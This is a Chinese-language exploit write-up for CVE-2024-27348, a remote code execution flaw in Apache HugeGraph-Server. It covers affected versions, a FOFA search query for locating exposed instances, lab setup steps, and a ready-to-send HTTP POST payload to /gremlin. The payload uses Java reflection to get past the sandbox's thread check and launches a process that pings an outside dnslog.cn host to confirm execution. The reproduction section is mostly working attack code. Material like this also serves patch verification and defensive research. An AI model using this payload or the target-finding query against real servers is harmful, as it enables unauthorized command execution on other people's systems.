# CVE-2024-27348

> **Created by：** A-little-dragon
>
> **Team：** TracelessSec
>
> **漏洞描述：** Apache HugeGraph-Server 远程代码执行漏洞



# 0x01 漏洞描述

HugeGraph是一个速度快、高度可扩展的图数据库。由于其出色的 OLTP 能力，HugeGraph 可以轻松存储和查询数十亿个点和边。由于遵循`Apache TinkerPop 3`框架，可以通过Gremlin（一种强大的图遍历语言）实现各种复杂的图查询。`Apache HugeGraph-Server` 中存在 RCE-远程命令执行漏洞

# 0x02 影响范围

```
Apache HugeGraph-Server: from 1.0.0 before 1.3.0.
```

# 0x03 FOFA语法

```bash
app="HugeGraph-Studio"
```

# 0x04 环境搭建

```
wget https://downloads.apache.org/incubator/hugegraph/1.2.0/apache-hugegraph-incubating-1.2.0.tar.gz
tar -zxf apache-hugegraph-incubating-1.2.0.tar.gz
```

然后修改hugegraph.properties文件内容

```
cd apache-hugegraph-incubating-1.2.0/conf/graphs

修改内容如下：
backend=memory
serializer=text
```

修改rest-server.properties文件内容

```bash
cd /root/apache-hugegraph-incubating-1.2.0/conf

修改监听的地址：
restserver.url=http://your-ip:8080

```

启动服务

```
bin/start-hugegraph.sh
```

# 0x05 漏洞复现

```
POST /gremlin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"ping\", \"123.ctsvy.dnslog.cn\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);", "bindings": {}, "language": "gremlin-groovy", "aliases": {}}
```